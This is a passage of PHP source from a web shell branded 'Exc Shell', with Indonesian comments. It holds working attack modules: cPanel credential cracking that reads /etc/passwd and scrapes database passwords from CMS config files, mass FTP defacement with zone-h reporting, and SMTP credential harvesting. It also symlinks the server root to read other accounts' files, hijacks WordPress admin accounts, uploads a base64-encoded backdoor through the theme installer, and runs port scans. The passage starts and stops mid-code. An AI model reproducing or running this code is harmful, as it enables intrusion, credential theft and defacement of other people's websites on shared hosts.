		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>Exc Shell.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					$pass .= $pass1[1]."\n";
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'cpftp_auto') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							//
						} else {
							echo "[+] username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
							$ftp_conn = ftp_connect(gethostbyname($_SERVER['HTTP_HOST']));
							$ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
							if((!$ftp_login) || (!$ftp_conn)) {
								echo "[+] <font color=red>Login Gagal</font><br><br>";
							} else {
								echo "[+] <font color=lime>Login Sukses</font><br>";
								$fi = htmlspecialchars($_POST['file_deface']);
								$deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
								if($deface) {
									$i++;
									echo "[+] <font color=lime>Deface Sukses</font><br>";
									if(function_exists('posix_getpwuid')) {
										$domain_cp = file_get_contents("/etc/named.conf");	
										if($domain_cp == '') {
											echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
										} else {
											preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
											foreach($domains_cp[1] as $dj) {
												$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
												$user_cp_url = $user_cp_url['name'];
												if($user_cp_url == $ucp) {
													echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
													break;
												}	
											}
										}
									} else {
										echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
									}
								} else {
									echo "[-] <font color=red>Deface Gagal</font><br><br>";
								}
							}
							//echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses deface ".$i." Cpanel by <font color=lime>Exc Shell</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		Filename: <br>
		<input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
		Deface Page: <br>
		<input type='text' name='deface' placeholder='http://www.web-yang-udah-di-deface.com/filemu.php' style='width: 450px;'><br>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					$pass .= $pass1[1]."\n";
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Hajar'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'smtp') {
	echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
	if($_POST['hajar']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=lime>sukses di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit Title+Content WordPress</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by Unknown1337' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Unknown1337'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";

} elseif($_GET['do'] == 'symlink')
{	
@set_time_limit(0);

echo "<br><br><center><h1>Symlink by Exc Shell</h1></center><br><br><center><div class=content>";

@mkdir('sym',0777);
$htaccess  = "Options all n DirectoryIndex Sux.html n AddType text/plain .php n AddHandler server-parsed .php n  AddType text/plain .html n AddHandler txt .html n Require None n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='lime' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '.ir';
$israel = '.il';
$indo   = '.id';
$sg12   = '.sg';
$edu    = '.edu';
$gov    = '.gov';
$gose   = '.go';
$gober  = '.gob';
$mil1   = '.mil';
$mil2   = '.mi';
$malay	= '.my';
$china	= '.cn';
$japan	= '.jp';
$austr	= '.au';
$porn	= '.xxx';
$as		= '.uk';
$calfn	= '.ca';

if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   

}  elseif($_GET['do'] == 'fake_root') {
	ob_start();
	function reverse($url) {
		$ch = curl_init("http://domains.yougetsignal.com/domains.php");
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
			  curl_setopt($ch, CURLOPT_HEADER, 0);
			  curl_setopt($ch, CURLOPT_POST, 1);
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
		foreach($array as $lnk) {
			$lnk = "http://$lnk";
			$lnk = str_replace(",", "", $lnk);
			echo $lnk."\n";
			ob_flush();
			flush();
		}
			  curl_close($ch);
	}
	function cek($url) {
		$ch = curl_init($url);
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		$resp = curl_exec($ch);
		return $resp;
	}
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = cek("$url/~$user/$file");
			if(preg_match("/hacked/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
		User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 250px;' name='url'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
	}
} elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
} elseif($_GET['do'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$scan = $_POST['link_config'];
		$link_config = scandir($scan);
		$script = htmlspecialchars($_POST['script']);
		$user = "Unknown1337";
		$pass = "Unknown1337";
		$passx = md5($pass);
		foreach($link_config as $dir_config) {
			if(!is_file("$scan/$dir_config")) continue;
			$config = file_get_contents("$scan/$dir_config");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."users";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				if($target == '') {					
					echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
				} else {
					echo "[+] $target <br>";
				}
				$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
				if(!$conn OR !$db OR !$update) {
					echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
					mysql_close($conn);
				} else {
					$site = "$target/wp-login.php";
					$site2 = "$target/wp-admin/theme-install.php?upload";
					$b1 = anucurl($site2);
					$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
					$b = lohgin($site, $site2, $user, $pass, $wp_sub);
					$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
					$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
					$www = "m.php";
					$fp5 = fopen($www,"w");
					fputs($fp5,$upload3);
					$post2 = array(
							"_wpnonce" => "$anu2",
							"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
							"themezip" => "@$www",
							"install-theme-submit" => "Install Now",
							);
					$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
						  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						  curl_setopt($ch, CURLOPT_POST, 1);
						  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
						  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
						  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
					      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
					$data3 = curl_exec($ch);
						  curl_close($ch);
					$y = date("Y");
					$m = date("m");
					$namafile = "id.php";
					$fpi = fopen($namafile,"w");
					fputs($fpi,$script);
					$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
						   curl_setopt($ch6, CURLOPT_POST, true);
						   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
						   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
						   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  		   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  		   curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
					$postResult = curl_exec($ch6);
						   curl_close($ch6);
					$as = "$target/k.php";
					$bs = anucurl($as);
					if(preg_match("#$script#is", $bs)) {
            	       	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
            	       	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
            	        } else {
            	        echo "[-] <font color='red'>gagal mepes...</font><br>";
            	        echo "[!!] coba aja manual: <br>";
            	        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
            	        echo "[+] username: <font color=lime>$user</font><br>";
            	        echo "[+] password: <font color=lime>$pass</font><br><br>";     
            	        }
            		mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface</h1>
		<form method='post'>
		<input type='text' name='link_config' size='50' height='10' value='$dir'><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Unknown1337' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form>
		<br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
		</center>";
	}
} 
	elseif($_GET['do'] == 'whois'){ 
   ?>
   <form action="?dir=<?php echo $dir; ?>&do=whois" method="post">
   <?php
   @set_time_limit(0);
   @error_reporting(0);
   function sws_domain_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/whois/$site");
   flush();
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_net_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/asinfo/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_site_ser($site)
   {
   $getip = @file_get_contents("http://networktools.nl/reverseip/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_sup_dom($site)
   {
   $getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
   $ip = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');
   return $ip;
   flush();
   }
   function sws_port_scan($ip)
   {
   $list_post = array('80','21','22','2082','25','53','110','443','143');
   foreach ($list_post as $o_port)
   {
   $connect = @fsockopen($ip,$o_port,$errno,$errstr,5);
   if($connect)
   {
   echo " $ip : $o_port ??? <u style=\"color: white\">Open</u> <br /><br />";
   flush();
   }
   }
   }
   function findit($mytext,$starttag,$endtag) {
   $posLeft = @stripos($mytext,$starttag)+strlen($starttag);
   $posRight = @stripos($mytext,$endtag,$posLeft+1);
   return @substr($mytext,$posLeft,$posRight-$posLeft);
   flush();
   }
   echo '<br><br><center>';
   echo '
    <br />
    <div class="sc"><form method="post"><table class="tabnet">
	<tr><th colspan="5">Website Whois</th></tr>
    <tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:white;background-color:#000000" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" style="color:white;background-color:#000000" name="scan" value="Scan !" /></td></tr>
    </table></form></div>';
   if(isset($_POST['scan']))
   {
   $site = @htmlentities($_POST['site']);
   if (empty($site)){die('<br /><br /> Not add IP .. !');}
   $ip_port = @gethostbyname($site);
   echo "
   <br /><div class=\"sc2\">Scanning [ $site ip $ip_port ] ... </div>
   <div class=\"tit\"> <br /><br />|-------------- Port Server ------------------| <br /></div>
   <div class=\"ru\"> <br /><br /><pre>
   ";
   echo "".sws_port_scan($ip_port)." </pre></div> ";
   flush();
   echo "<div class=\"tit\"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
   <div class=\"ru\">
   <pre>".sws_domain_info($site)."</pre></div>";
   flush();
   echo "
   <div class=\"tit\"> <br /><br />|-------------- Network Info ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_net_info($site)."</pre> </div>";
   flush();
   echo "<div class=\"tit\"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_sup_dom($site)."</pre> </div>";
   flush();
   echo "<div class=\"tit\"> <br /><br />|-------------- Site Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_site_ser($site)."</pre> </div>
